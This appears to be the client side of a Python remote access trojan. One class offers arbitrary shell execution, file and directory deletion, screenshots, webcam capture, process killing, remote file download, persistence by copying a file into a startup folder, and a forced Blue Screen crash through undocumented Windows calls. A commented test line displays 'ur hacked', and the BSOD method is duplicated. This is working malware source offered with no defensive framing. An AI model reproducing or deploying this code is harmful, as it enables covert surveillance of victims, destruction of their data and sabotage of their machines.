import tkinter as tk
import ctypes, subprocess, pyttsx3, os, shutil, requests, platform, sys, datetime, webbrowser, wmi, psutil, cv2
from PIL import ImageGrab
from urllib.parse import urlparse

class Client:
    def __init__(self) -> None:
        pass
    
    def showMessage(self, title, message):
        try:
            window = tk.Tk()

            window.title(title)
            window.attributes("-topmost", True)
            
            window.geometry(f"{window.winfo_screenwidth() - 200}x{window.winfo_screenheight() - 200}")

            window.eval('tk::PlaceWindow . center')

            message = tk.Label(window, text=message)
            message.pack()

            window.mainloop()

        except Exception as e:
            return ("An error occurred:", str(e))
        
        return True

    def runShellCommand(self, command):
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result

    def voice(self, text):
        try:
            engine = pyttsx3.init()
            engine.say(text)
            engine.runAndWait()
        except Exception:
            return Exception
        
        return f"Done saying \"{text}\"... ig?"

    def isAdmin(self):
        try:
            is_admin = (os.getuid() == 0)
        except AttributeError:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        return is_admin

    def deleteFile(self, filename):
        if os.path.exists(filename):
            try:
                os.remove(filename)
            except Exception:
                return Exception
            return True
        else:
            return "File not found!"
        
    def deleteDir(self, dir_path):
        try:
            shutil.rmtree(dir_path)
            return f"Directory \"{dir_path}\" deleted successfully."
        except FileNotFoundError:
            return f"Directory \"{dir_path}\" not found."
        except PermissionError:
            return f"Permission denied. Unable to delete directory \"{dir_path}\"."
        except Exception as e:
            return f"An error occurred while deleting directory \"{dir_path}\": {str(e)}"
        
    def changeDir(self, new_dir):
        if not os.path.isdir(new_dir):
            print("Directory was not found!")
            return False
        try:
            self.runShellCommand(f"cd {new_dir}")
        except Exception:
            return Exception
        
        return True
    
    def displayCurrentDirItems(self):
        if os.path.exists('.'):
            return os.listdir('.')
        else:
            print("Directory does not exist.")
            return False
        
    def getPublicIP(self):
        response = requests.get('https://ip.me')
        ip_address = response.text.strip()
        return ip_address

    def changeWallpaper(self, wallpaper_path):
        if not os.path.exists(wallpaper_path): return "File does not exist!"
        try:
            wallpaper_style = 0

            SPI_SETDESKWALLPAPER = 20
            image = ctypes.c_wchar_p(wallpaper_path)

            result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image, wallpaper_style)
            if result:
                return "Wallpaper changed successfully!"
            else:
                return "Failed to change the wallpaper."

        except Exception as e:
            return "An error occurred while changing the wallpaper:", str(e)

    
    def displayCurrentDir(self):
        try:
            return os.path.abspath(os.getcwd())
        except OSError as e:
            return "Error:", e

    def getScreenshot(self):
        try:
            screenshot = ImageGrab.grab()

            screenshot.save("screenshot.png")

            return "Screenshot captured and saved successfully!"
        except Exception as e:
            return f"An error occurred while capturing the screenshot: {str(e)}"

    def shutdownComputer(self):
        try:
            if os.name == 'nt':  # for Windows
                os.system('shutdown /s /t 0')
            elif os.name == 'posix':  # for Unix/Linux/Mac
                os.system('sudo shutdown now')
            else:
                raise OSError("Unsupported operating system")
        except OSError as e:
            print(f"Error while shutting down: {e}")

    def restartComputer(self):
        try:
            os.system("shutdown /r /t 1")
            print("Restart command sent successfully.")
        except OSError as e:
            print(f"An error occurred while restarting the computer: {e}")
    
    def logOffCurrentUser(self):
        operating_system = platform.system()

        try:
            if operating_system == "Windows":
                from win32api import ExitWindowsEx
                from win32con import EWX_LOGOFF
                ExitWindowsEx(EWX_LOGOFF, 0)
            elif operating_system == "Darwin":  # macOS
                subprocess.run(["osascript", "-e", 'tell app "System Events" to log out'])
            elif operating_system == "Linux":
                subprocess.run(["gnome-session-quit", "--logout", "--no-prompt"])
            else:
                raise OSError("Unsupported operating system")
        except Exception as e:
            print(f"Error logging off: {e}")
            sys.exit(1)

    def triggerBSOD(self):
        from ctypes import windll
        from ctypes import c_int
        from ctypes import c_uint
        from ctypes import c_ulong
        from ctypes import POINTER
        from ctypes import byref

        nullptr = POINTER(c_int)()

        try:
            print("Adjusting privileges...")
            windll.ntdll.RtlAdjustPrivilege(
                c_uint(19), 
                c_uint(1), 
                c_uint(0), 
                byref(c_int())
            )
            print("Privileges adjusted successfully.")

            print("Raising hard error...")
            windll.ntdll.NtRaiseHardError(
                c_ulong(0xC000007B), 
                c_ulong(0), 
                nullptr, 
                nullptr, 
                c_uint(6), 
                byref(c_uint())
            )
            print("Hard error raised successfully.")
            return True
        except Exception as e:
            print("An error occurred: ", e)
            return False

    def triggerBSOD(self):
        from ctypes import windll
        from ctypes import c_int
        from ctypes import c_uint
        from ctypes import c_ulong
        from ctypes import POINTER
        from ctypes import byref

        nullptr = POINTER(c_int)()

        try:
            print("Adjusting privileges...")
            windll.ntdll.RtlAdjustPrivilege(
                c_uint(19), 
                c_uint(1), 
                c_uint(0), 
                byref(c_int())
            )
            print("Privileges adjusted successfully.")

            print("Raising hard error...")
            windll.ntdll.NtRaiseHardError(
                c_ulong(0xC000007B), 
                c_ulong(0), 
                nullptr, 
                nullptr, 
                c_uint(6), 
                byref(c_uint())
            )
            print("Hard error raised successfully.")
            return True
        except Exception as e:
            print("An error occurred: ", e)
            return False

    def currentDateTime(self):
        try:
            current_date_time = datetime.datetime.now()
            formatted_date_time = current_date_time.strftime("%A, %B %d, %Y %I:%M:%S %p")
            return formatted_date_time
        except Exception as e:
            return "An error occurred:", str(e)
    
    def uploadContent(self, link, destination=None):
        response = requests.get(link)
        if destination is None:
            filename = link.split("/")[-1]
            destination = os.path.join(os.path.abspath(os.getcwd()), filename)
        try:
            with open(destination, "wb") as file:
                file.write(response.content)
            return "Content downloaded successfully!"
        except Exception as e:
            return f"An error occurred while downloading the content: {str(e)}"
    def addFileToStartUp(self, file_path):
        try:
            # file_path = f"{os.path.abspath(os.getcwd())}\main.exe"
            # TODO: compile to exe and add it here
            # file_path = "C:\\Users\\rianm\\Desktop\\testing smth smh\\main.py"
            startup_folder_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Start"

            shutil.copy(file_path, startup_folder_path)
            return "File successfully added to startup folder."
        except FileNotFoundError:
            return "File not found. Please check the file path."
        except PermissionError:
            return "Permission denied. Make sure you have the necessary permissions to copy the file."
        except Exception as e:
            return "An error occurred:", str(e)

    def isValidURL(self, URL):
        try:
            result = urlparse(URL)
            return all([result.scheme, result.netloc])
        except ValueError:
            return False
        
    def openWebsite(self, URL):
        if not URL.startswith("https://"):
            URL = f"https://{URL}"
        
        print(self.isValidURL(URL))
        if self.isValidURL(URL) == False:
            return "URL not valid!"
        try:
            webbrowser.open(URL)
            return "Website opened successfully!"
        except Exception as e:
            return f"An error occurred while opening the website: {e}"
    
    def Exit(self):
        try:
            print("Exiting...")
            sys.exit()
        except Exception:
            return Exception

    def listProcesses(self):
        f = wmi.WMI()

        print("pid Process name")

        lst = []
        for process in f.Win32_Process():
            lst.append(f"{process.ProcessId} {process.Name}") 

        return lst

    def killProcess(self, process_name):
        try:
            for proc in psutil.process_iter():
                if proc.name() == process_name:
                    proc.kill()
            return "Process killed successfully."
        except psutil.NoSuchProcess:
            return "No such process found."
        except psutil.AccessDenied:
            return "Access denied to kill the process."

    def list_cameras(self):
        camera_index = 0
        active_cameras = []

        while True:
            cap = cv2.VideoCapture(camera_index)
            if not cap.isOpened():
                break
            else:
                active_cameras.append(camera_index)
            cap.release()
            camera_index += 1

        return active_cameras

    def capture_image(self, camera_index):
        try:
            cap = cv2.VideoCapture(camera_index)

            if not cap.isOpened():
                raise Exception("Could not open camera")

            ret, frame = cap.read()

            if not ret:
                raise Exception("Could not capture frame")

            cv2.imwrite("captured_image.jpg", frame)

            cap.release()
            cv2.destroyAllWindows()

            return "Image captured successfully"
        
        except Exception as e:
            return str(e)

if __name__ == "__main__":
    Client = Client()
    # Client.showMessage(title="Hey!", message="idk but ig ur hacked lol")
    # print(Client.runShellCommand("whoami").stdout)
    # print(Client.voice(text="test"))
    # print(Client.isAdmin())
    # print(Client.deleteFile("hat.jpg"))
    # print(Client.deleteDir("idk2"))
    # print(Client.changeDir("New folder"))
    # print(Client.displayCurrentDirItems())
    # print(Client.getPublicIP())
    # print(Client.changeWallpaper("C:\\Users\\rianm\\Desktop\\testing smth smh\\downloaded_attachment.jpg"))
    # print(Client.displayCurrentDir())
    # print(Client.getScreenshot())
    # print(Client.shutdownComputer())
    # print(Client.restartComputer())
    # print(Client.logOffCurrentUser())
    # print(Client.triggerBSOD())
    # print(Client.currentDateTime())
    # print(Client.uploadContent("https://raw.githubusercontent.com/K-K-L-L/k-k-l-l.github.io/main/index.html"))
    # print(Client.addFileToStartUp(f"C:\\Users\\{os.getlogin()}\\Desktop\\testing smth smh\\main.py"))
    # print(Client.openWebsite("example.com"))
    # print(Client.Exit())
    # for item in Client.listProcesses():
    #     print(item)
    # print(Client.killProcess("Obsidian.exe"))
    # print(Client.list_cameras())
    # print(Client.capture_image(camera_index=0))
